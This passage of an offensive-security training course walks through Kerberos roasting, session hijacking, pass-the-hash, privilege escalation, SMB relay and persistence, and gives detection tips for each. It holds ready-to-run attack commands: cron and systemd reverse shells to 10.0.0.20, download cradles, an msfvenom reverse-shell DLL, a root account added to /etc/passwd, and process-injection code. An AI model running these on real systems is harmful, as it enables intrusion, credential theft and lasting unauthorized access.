When preauthentication is disabled, anyone can request an AS-REP encrypted with the user's password hash. The adversary requests this ticket and cracks it offline.

# Enumerate accounts without pre-auth and extract hashes
GetNPUsers.py <domain>/<user>:'<password>' -dc-ip <dc-ip> -request

# Crack AS-REP hashes (Hashcat mode 18200)
hashcat -m 18200 asrep_hashes.txt -a 0 wordlist.txt --show
🎯 Key Takeaway: AS-REP roasting requires no valid credentials to initiate against misconfigured accounts. It is a silent enumeration technique that leaves only a single AS-REQ/AS-REP event. Detection opportunities: Audit for user accounts with Do not require Kerberos preauthentication enabled; monitor Event ID 4625 and 4768 anomalies; enable preauthentication domain-wide.

Example 4.4: Session Hijacking & Fixation

Adversary Objective: Bypass authentication entirely by stealing or fixing an active session token.

An adversary positioned on the network captures unencrypted HTTP traffic containing session cookies. Alternatively, they inject a known session ID via XSS or URL parameters before the victim authenticates, fixing the session to an ID the adversary controls.

# Intercept session cookies from plaintext HTTP
tcpdump -i eth0 -A port 80 | grep -E "Cookie:|Set-Cookie:"

# Reuse a stolen session cookie to access a protected dashboard
curl --cookie "session=<stolen_token>" http://<target>/dashboard

# Session fixation: force a victim to use a known session ID
curl --cookie "PHPSESSID=<attacker_session_id>" http://<target>/login
🎯 Key Takeaway: Session hijacking allows an adversary to impersonate a user without credentials. Session fixation forces the victim to bind their authenticated session to a token known in advance by the attacker. Detection opportunities: Enforce HTTPS/HSTS; use Secure, HttpOnly, SameSite cookies; implement session rotation after authentication; monitor for concurrent sessions from disparate geolocations.

Example 4.5: MFA Fatigue & Phishing for OTPs

Adversary Objective: Bypass multi-factor authentication by either exhausting the target's attention or proxying the login in real time.

Against push-based MFA (Microsoft Authenticator, Duo, etc.), an adversary initiates dozens of authentication requests in rapid succession. The target, annoyed or confused, eventually approves one. Alternatively, the adversary deploys an adversary-in-the-middle (AiTM) proxy (e.g., Evilginx, Muraena) that harvests both the password and the time-based OTP in real time before forwarding them to the legitimate service.

# Adversary-in-the-Middle: Proxy a legitimate Okta login portal
evilginx phishlets-host <phishlet> <attacker-ip>
evilginx lure-generate <phishlet>

# Replay a stolen TOTP code before it expires
curl -X POST https://<target>/api/mfa_verify \
  -H "Content-Type: application/json" \
  -d '{"username":"<user>","mfa_code":"<otp>"}'
🎯 Key Takeaway: MFA is not authentication perfection. Push fatigue exploits human psychology; AiTM proxies defeat time-based OTP by relaying it within the validity window. Detection opportunities: Monitor for multiple MFA push notifications from a single source; deploy number matching or phishing-resistant FIDO2/WebAuthn tokens; flag rapid sequential logins with identical device fingerprints.

Example 4.6: Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)

Adversary Objective: Authenticate to remote systems using stolen credential material without ever recovering the plaintext password.

From LSASS memory, an adversary extracts NTLM hashes or Kerberos tickets. Rather than cracking them, the adversary injects the hash or ticket directly into a new process to authenticate laterally.

# Extract hashes from LSASS memory using Mimikatz

# Pass-the-Hash: authenticate using the raw NTLM hash
netexec smb <target> -u <user> -H <ntlm_hash>
psexec.py <domain>/<user>@<target> -hashes <hash>

# Pass-the-Ticket: inject a stolen Kerberos TGT into the current session
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt [0;123456]@krbtgt-<domain>.kirbi

# Access resources using the injected ticket
dir \\<domain_controller>\C$
🎯 Key Takeaway: PtH and PtT are the backbone of lateral movement in Windows environments. NTLM hashes and Kerberos tickets are cryptographic equivalents of passwords in many protocols. Detection opportunities: Monitor Event IDs 4624 (logon type 3) and 4768/4769 for anomalous NTLM/Kerberos usage; implement Windows Credential Guard to isolate LSASS; restrict lateral movement via local administrator password solution (LAPS) and Privileged Access Workstations (PAW).

Phase 5: Authorization Escalation & Lateral Movement (The Expand Vector)

Adversarial goal: Move from low-level access to high-privilege control.

  • Core concept: Authorization.
  • Privilege escalation: Exploit bugs or misconfigurations to gain admin, root, or SYSTEM-level access.
  • Lateral movement: Use compromised credentials to move from one host to another inside the network.
  • Access control misuse: Abuse permissions granted to a user, group, or service account.
  • Key techniques: Pass-the-Hash, token manipulation, SMB relaying, and Active Directory group abuse.

Example 5.1: Linux Privilege Escalation via Sudo Misconfiguration

Adversary Objective: Escalate from a low-privilege Linux account to root by exploiting misconfigured sudo permissions.

An adversary with interactive shell access enumerates sudo privileges using sudo -l or automated scripts like LinPEAS. If the user is granted NOPASSWD rights over specific binaries, the adversary consults resources such as GTFOBins to execute arbitrary commands in the context of root without ever knowing the root password.

# Enumerate available sudo privileges
sudo -l

# Automated privilege-escalation enumeration
./linpeas.sh | tee enum.txt

# Abuse via GTFOBins (examples: find, vim, bash)
sudo find . -exec /bin/bash \; -quit
sudo vim -c ':!/bin/bash'
sudo bash

# Maintain persistence after escalation
echo "<user>:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys
🎯 Key Takeaway: Sudo misconfigurations are common privilege-escalation vectors. Adversaries use:
  • GTFOBins: Curated database of Unix binaries exploitable for privilege escalation
  • NOPASSWD: Commands executable without password authentication
  • LinPEAS: Automated enumeration of weak permissions and misconfigurations
Detection opportunities: Audit /etc/sudoers regularly, restrict sudo to the minimum necessary commands, monitor for unusual sudo execution, and enforce SELinux/AppArmor profiles.

Example 5.2: Windows Privilege Escalation via Unquoted Service Paths

Adversary Objective: Escalate from a low-privilege Windows user to SYSTEM by exploiting unquoted service paths.

When a service binary path contains spaces and is not enclosed in quotes, Windows parses the path left-to-right and executes the first binary it finds. An adversary with write access to an early directory in that path places a malicious executable there, causing the service to run it with SYSTEM privileges on next start.

# Enumerate unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "\""

# Automated enumeration
.\winPEAS.exe > enum.txt

# Check directory write permissions
icacls "C:\Program Files\<Vendor>"

# Generate malicious binary and place it in the unquoted path

🎯 Key Takeaway: Unquoted service paths allow arbitrary code execution at SYSTEM integrity. Adversaries rely on:
  • wmic / winPEAS: Enumeration of vulnerable services

  • Service restart: Triggering execution without a system reboot
Detection opportunities: Audit service paths during deployment, enforce quoted paths, restrict directory permissions, and monitor for service binary modifications.

Example 5.3: Lateral Movement via SMB Relay

Adversary Objective: Authenticate to remote systems by relaying captured NTLM hashes without cracking them.

An adversary positions themselves on the network to capture NTLM challenge-response traffic, then relays those credentials to hosts where SMB signing is disabled. This grants remote code execution or interactive access as the relayed user.

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Capture authentication attempts
responder -I eth0 -w -d

# Relay captured hashes to a target host
ntlmrelayx.py -t smb://<target> -smb2support -c "whoami > C:\temp\out.txt"

# Interactive SMB shell via relay
ntlmrelayx.py -t smb://<target> -smb2support -i

# Verify execution with relayed credentials
netexec smb <target> -u <user> -p '' -x "type C:\temp\out.txt"
🎯 Key Takeaway: SMB relay attacks exploit the absence of SMB signing to reuse NTLM credentials in real time. Adversaries use:
  • Responder: Forced authentication and hash capture
  • ntlmrelayx.py: Relay to execute commands or dump secrets
  • SMB signing disabled: Prerequisite for successful relay
Detection opportunities: Enforce SMB signing domain-wide, segment networks, monitor for anomalous SMB sessions, and detect forced authentication patterns (LLMNR/NBT-NS poisoning).

Example 5.4: Active Directory Group Abuse

Adversary Objective: Escalate privileges by abusing Active Directory group memberships and delegated permissions.

An adversary with any valid domain account enumerates group memberships, identifies nested or delegated rights, and visualizes attack paths. Where write permissions exist against group objects, the adversary adds themselves or a controlled account to a privileged group.

# Enumerate group memberships with PowerView

🎯 Key Takeaway: AD group abuse is a silent path to total domain compromise. Adversaries leverage:
  • BloodHound: Graph-based visualization of escalation paths
  • PowerView: Enumeration of groups, ACLs, and trusts
  • Delegated permissions: Write access to group or user objects
Detection opportunities: Monitor Event IDs 4728/4732 for privileged group modifications, audit AD delegations, implement tiered administration, and enforce Just-In-Time (JIT) access.

Example 5.5: Lateral Movement via WMI, WinRM, and PsExec

Adversary Objective: Move laterally across a Windows environment using built-in remote-management protocols and valid credentials.

With domain or local credentials in hand, an adversary executes commands via WMI, establishes interactive PowerShell sessions over WinRM, or uses PsExec to obtain a SYSTEM-level command shell on a remote host.

🎯 Key Takeaway: WMI, WinRM, and SMB are the highways of lateral movement. Adversaries use:
  • wmiexec.py: Covert command execution via WMI
  • evil-winrm: Interactive PowerShell remoting
  • psexec.py: Service-based SYSTEM access

  • Invoke-TokenManipulation: Reflective, in-memory token abuse

Phase 6: Persistence & Evasion (The Stay Vector)

Adversarial goal: Maintain access even if the first entry point gets closed or detected.

  • Core concept: Persistence, with direct impact on accountability and non-repudiation.
  • Backdoors: Add accounts, scheduled tasks, services, or startup entries to enable re-entry.
  • Rootkits and hooking: Hide processes, files, or activity from standard operating system tools.
  • Living off the land: Use built-in tools such as PowerShell, PsExec, WMI, or cron to reduce suspicious file drops.
  • Key techniques: Registry run keys, cron jobs, DLL side-loading, process injection, and signed binary abuse.

Adversarial Examples: Phase 6 — Persistence & Evasion

⚠️ Threat Intelligence Context: The following examples represent real-world adversary tradecraft observed in enterprise intrusions. They are documented here for defensive analysis and detection engineering in authorized environments only.

Example 6.1: Registry Run Key Persistence

Adversary Objective: Maintain user-level or system-level persistence that survives reboots by writing to Windows registry autorun keys.

An adversary adds a malicious entry to HKCU\Software\Microsoft\Windows\CurrentVersion\Run or HKLM\Software\Microsoft\Windows\CurrentVersion\Run to execute a payload at user login or system startup.

# User-level persistence (standard user)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "C:\Users\Public\backdoor.exe" /f

# System-level persistence (requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v SystemUpdate /t REG_SZ /d "C:\Windows\Temp\persistence.exe" /f

# PowerShell alternative
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "PowerShellBackdoor" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1" -PropertyType String
🎯 Key Takeaway: Registry run keys provide simple, reliable persistence that executes every time a user logs in. Detection opportunities: Monitor Event ID 4657 (registry modifications to Run/RunOnce keys); use Sysinternals Autoruns to enumerate all autorun locations; deploy EDR with registry telemetry.

Example 6.2: Scheduled Task Persistence

Adversary Objective: Establish persistence through scheduled tasks that execute at defined intervals or system events.

Scheduled tasks can be configured to run on user login, at system startup, or on a recurring schedule. This allows an adversary to re-establish access even if their initial entry point is removed.

# Create a task that runs every 5 minutes
schtasks /create /tn "WindowsUpdateService" /tr "C:\Users\Public\backdoor.exe" /sc minute /mo 5 /f

# Create a task that runs at system startup (SYSTEM context)
schtasks /create /tn "SystemStartupBackdoor" /tr "C:\Windows\Temp\persistence.exe" /sc onstart /ru SYSTEM /f

# PowerShell alternative
$action = New-ScheduledTaskAction -Execute "C:\Users\Public\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "DOMAIN\user"
Register-ScheduledTask -TaskName "UpdateService" -Action $action -Trigger $trigger
🎯 Key Takeaway: Scheduled tasks provide resilient persistence with fine-grained scheduling controls and SYSTEM-level execution. Detection opportunities: Monitor Event IDs 4698 (task creation) and 4702 (task update); audit scheduled tasks with schtasks /query; deploy EDR with process lineage visibility.

Example 6.3: Service Installation Persistence

Adversary Objective: Install a malicious service that automatically starts with the operating system.

Services run with SYSTEM privileges and persist across reboots. An adversary can create a new service or modify an existing one to execute arbitrary commands.

# Create a new service that auto-starts
sc create "WindowsUpdateSvc" binPath= "C:\Windows\Temp\payload.exe" start= auto

# Create a service that executes a PowerShell payload
sc create "PowerShellUpdateSvc" binPath= "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1" start= auto

# Remote service creation (lateral movement)
netexec smb 10.0.0.25 -u administrator -p 'Password123!' -M sc_exe -o SERVICE_NAME=UpdateService SERVICE_PATH="C:\Windows\Temp\payload.exe"
🎯 Key Takeaway: Service installation provides SYSTEM-level persistence that survives reboots and is less visible than user-level mechanisms. Detection opportunities: Monitor Event ID 7045 (new service installed); audit services with sc query; deploy EDR with service creation telemetry; use application whitelisting.

Example 6.4: Linux Cron & Systemd Persistence

Adversary Objective: Establish persistence on Linux systems using cron jobs and systemd timers.

Cron jobs allow scheduled execution of commands at specified intervals. Systemd timers provide similar functionality with more granular control and logging capabilities.

# User-level cron: run every minute
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'") | crontab -

# System-level cron (requires root)
echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'" >> /etc/crontab

# @reboot cron: run at system startup
(crontab -l 2>/dev/null; echo "@reboot /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'") | crontab -

# Systemd service with auto-restart
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=Backdoor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.20/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable backdoor.service
systemctl start backdoor.service
🎯 Key Takeaway: Cron jobs and systemd timers are the backbone of Linux persistence. Systemd services offer more robust restart capabilities. Detection opportunities: Monitor /etc/crontab and user crontabs; audit systemd service files; use file integrity monitoring (FIM); deploy EDR with process lineage and scheduled task telemetry.

Example 6.5: SSH Key Persistence

Adversary Objective: Establish persistent, passwordless access via SSH public key authentication.

By appending a public key to ~/.ssh/authorized_keys, an adversary ensures they can re-enter the system even if passwords are changed or the initial entry point is patched.

# Generate a key pair on the attacker machine
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistent_key -N ""

# Copy the public key to the target's authorized_keys
ssh-copy-id -i ~/.ssh/persistent_key.pub user@10.0.0.10

# Manual addition (without ssh-copy-id)
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Test persistent access
ssh -i ~/.ssh/persistent_key user@10.0.0.10
🎯 Key Takeaway: SSH keys provide passwordless, persistent access that survives password changes. Root-level SSH keys are especially dangerous. Detection opportunities: Monitor ~/.ssh/authorized_keys for modifications; audit SSH key usage; implement certificate-based SSH; use file integrity monitoring (FIM).

Example 6.6: Process Injection

Adversary Objective: Execute malicious code within a legitimate process to evade detection and bypass application whitelisting.

By injecting code into a trusted process such as explorer.exe or svchost.exe, the adversary's payload runs under a legitimate process name, making it harder for security tools to detect.

# Using Mimikatz to inject into a running process
mimikatz # privilege::debug
mimikatz # process::list
mimikatz # process::start /pid:1234 /cmd:"cmd.exe /c echo Injected!"

# PowerShell-based process injection
$code = @"
using System;
using System.Runtime.InteropServices;
public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, int dwCreationFlags, IntPtr lpThreadId);
}
"@
Add-Type -TypeDefinition $code

$pid = (Get-Process -Name notepad).Id
$handle = [Injector]::OpenProcess(0x1F0FFF, $false, $pid)
$bytes = [System.Text.Encoding]::ASCII.GetBytes("cmd.exe /c whoami")
$addr = [Injector]::VirtualAllocEx($handle, [IntPtr]::Zero, $bytes.Length, 0x1000, 0x40)
[Injector]::WriteProcessMemory($handle, $addr, $bytes, $bytes.Length, [ref][IntPtr]::Zero)
[Injector]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
🎯 Key Takeaway: Process injection allows adversaries to run code inside trusted processes, evading detection and application whitelisting. Detection opportunities: Monitor for process injection patterns (Event ID 4663); use EDR with behavioral detection; implement code integrity checks; use Process Explorer to inspect loaded DLLs.

Example 6.7: DLL Side-Loading & Hijacking

Adversary Objective: Execute malicious code by placing a malicious DLL in a location where a legitimate application will load it.

Windows searches for DLLs in a specific order. By placing a malicious DLL in the application directory with a name that matches a missing DLL, the adversary can execute their code within the context of the legitimate application.

# Use Process Monitor to identify missing DLLs
# Filter: Process Name = vulnerable_app.exe, Result = NAME NOT FOUND
vulnerable_app.exe    CreateFile    C:\Program Files\App\missing.dll    NAME NOT FOUND

# Generate a malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.20 LPORT=4444 -f dll -o malicious.dll

# Place it in the application directory with the missing name
copy malicious.dll "C:\Program Files\App\missing.dll"

# Alternative: DLL Search Order Hijacking
# Place the DLL in a directory that is searched before the legitimate location
# Example: Place version.dll in C:\Windows\System32\ to intercept system calls
🎯 Key Takeaway: DLL side-loading uses legitimate binaries to load malicious code, bypassing many security controls. Detection opportunities: Monitor for DLL loading from unusual paths; use application whitelisting; enable DLL signing verification; deploy EDR with DLL load telemetry.

Example 6.8: Living Off the Land (LOLBins)

Adversary Objective: Execute commands and perform operations using built-in system tools to avoid dropping malicious files.

By using legitimate Windows tools such as PowerShell, WMI, certutil, and bitsadmin, adversaries can download, execute, and maintain access without writing a single malicious executable to disk.

# PowerShell download cradle (in-memory execution)
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).downloadString('http://10.0.0.20/payload.ps1')"

# WMI process creation
wmic process call create "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -c 'IEX(New-Object Net.WebClient).downloadString(\"http://10.0.0.20/payload.ps1\")'"

# certutil file download
certutil -urlcache -split -f http://10.0.0.20/payload.exe C:\Windows\Temp\payload.exe

# BITSAdmin file transfer
bitsadmin /transfer myJob /download /priority normal http://10.0.0.20/payload.exe C:\Windows\Temp\payload.exe

# regsvr32 script execution (squiblydoo)
regsvr32 /s /n /u /i:http://10.0.0.20/payload.sct scrobj.dll
🎯 Key Takeaway: LOLBins are the stealthiest way to execute malicious activity because they use trusted, signed Microsoft binaries. Detection opportunities: Enable PowerShell ScriptBlock and Module logging; monitor WMI activity; audit certutil, bitsadmin, and regsvr32 usage; deploy EDR with behavioral detection.

Example 6.9: Rootkits & Kernel-Level Persistence

Adversary Objective: Hide processes, files, and network connections using kernel-level manipulation to remain undetected.

Rootkits operate at the kernel level, intercepting system calls to hide malicious activity from user-mode tools like Task Manager, file explorers, and even some security software.

# Hide a process using Mimikatz (user-mode hiding)
mimikatz # privilege::debug
mimikatz # process::hide /pid:1234

# Hide files using Alternate Data Streams (ADS)
type backdoor.exe > C:\Windows\System32\svchost.exe:backdoor.exe
start C:\Windows\System32\svchost.exe:backdoor.exe

# Hide files using attributes
attrib +h +s C:\Windows\Temp\backdoor.exe

# Kernel-level driver loading (requires driver signing bypass)
sc create MaliciousDriver binPath= C:\Windows\Temp\driver.sys type= kernel start= auto
sc start MaliciousDriver
🎯 Key Takeaway: Rootkits provide the deepest level of stealth, hiding malicious activity from both user-mode tools and many detection sensors. Detection opportunities: Use anti-rootkit tools (GMER, RootkitRevealer); enable Driver Verifier; implement secure boot and memory integrity (Hyper-V); deploy EDR with kernel-level telemetry.

  1. Start with Availability and Confidentiality: Students first learn how adversaries disrupt services and steal information. These concepts form the foundation for understanding attack impact and risk.
  2. Move into Integrity: Data manipulation, log tampering, supply-chain attacks, and web application exploitation demonstrate how attackers alter trusted information to achieve their objectives.
  3. Progress into Authentication and Authorization: Credential attacks, session hijacking, privilege escalation, and lateral movement introduce the techniques adversaries use to expand access inside a target environment.
  4. Understand Non-repudiation: Logging, timestamping, and audit trails create accountability. Attackers target these controls to erase evidence and deny investigators the ability to attribute actions to a specific actor.
  5. Finish with Persistence and Evasion: Students now move beyond gaining access and learn how adversaries maintain long-term control through scheduled tasks, SSH keys, registry modifications, process injection, encrypted tunnels, and anti-forensic techniques.
Inside the Adversary Mindset: Access is only the beginning. Successful adversaries think in stages: disrupt, manipulate, steal, impersonate, expand, and remain. Every security control you encounter throughout this course can be viewed through that lens, either as a barrier to those objectives or a mechanism used to detect them.

5. Adversarial Level

Threat actor perspective. Advanced persistent threats, criminal groups, and hacktivists align their operations with strategic objectives, not just technical exploits. This level focuses on how adversaries weaponize information security concepts.

Threat Actor Behavior

Strategic Objectives

  • Nation-state actors use InfoWar categories (C2 warfare, intelligence-based warfare, psychological warfare) to achieve geopolitical objectives.
  • Criminal syndicates focus on economic warfare, disrupting financial systems, extorting organizations, and monetizing stolen data.
  • Hacktivists leverage psychological warfare defacement, data leaks, and disinformation campaigns to shape public perception.

Operational Phases

  • Treat persistence and evasion not as post-exploitation footnotes, but as strategic imperatives that bridge initial access to long-term operational impact.
  • Map every CIAAN principle to a MITRE ATT&CK phase.
  • Predict attacker paths from intelligence rather than from alerts.
  • Ensure offensive findings produce measurable defensive hardening.
